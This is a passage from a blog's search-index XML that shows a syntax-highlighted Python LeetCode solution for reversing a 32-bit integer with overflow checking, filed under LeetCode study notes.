class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def <span class="built_in">reverse</span>(self, <span class="keyword">x</span>: <span class="keyword">int</span>) -&gt; in<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">y</span>, <span class="keyword">res</span> = <span class="built_in">abs</span>(<span class="keyword">x</span>), <span class="number">0</span></span><br><span class="line">        of = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - <span class="number">1</span> <span class="keyword">if</span> <span class="keyword">x</span> &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">y</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">res</span> = <span class="keyword">res</span> * <span class="number">10</span> + <span class="keyword">y</span> % <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">res</span> &gt; of: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">y</span> //= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">res</span> <span class="keyword">if</span> <span class="keyword">x</span> &gt; <span class="number">0</span> <span class="keyword">else</span> -<span class="keyword">res</span></span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LeetCode刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 整数反转 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
